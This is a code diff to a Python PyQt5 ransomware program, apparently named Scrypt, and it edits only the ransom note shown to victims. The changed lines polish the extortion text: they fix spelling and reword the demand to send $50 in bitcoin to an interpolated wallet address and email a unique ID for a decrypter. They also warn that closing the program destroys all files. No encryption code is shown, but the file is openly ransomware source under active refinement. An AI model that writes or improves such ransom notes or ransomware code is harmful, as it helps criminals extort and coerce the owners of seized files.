@@ -204,13 +204,13 @@ class Scrypt(PyQt5.QtWidgets.QMainWindow):
 detailedNote = f"""
 -------------------------------------------------------------------------------------------------------------------------
 Hello,\n
-    If you are reading this then you have likely been hit by Scrypt Ransomware\n
-    We apologize for the incovience, at the end of the day we just want to get paid\n
+    If you are reading this then you have likely been hit by my Ransomware\n
+    We apologize for any inconvenience caused; our primary goal is to facilitate a resolution through payment.\n
     In order to receive the decrypter you must follow the following steps to truely recover\n
     all your files.\n
     1. Download BitPay: https://bitpay.com/wallet/ if you are using a different wallet thats fine.\n
     2. Send $50 to this address: {btcAdd}\n
-    3. After sending it wait for a confirmation and send us an email and include your UniqueID: {Ransomware().randomId}\n
+    3. After sending it wait for a confirmation and send us an email with your UniqueID: {Ransomware().randomId}\n
     4. Wait shortly, you will receive an email with your decrypter once everything is handled.\n
     5. If we do not receive payment within 2 weeks we will no longer be handeling support.
 -------------------------------------------------------------------------------------------------------------------------
@@ -231,7 +231,7 @@ Email: {email}\n
 UniqueID: {Ransomware().randomId}\n
 ------------------------------------\n
 Click the Button Below To Continue:
-(Killing this program will result in a full lose of files)\n
+(Killing this program will result in a full loss of files)\n
 """
 
 if __name__ == "__main__":
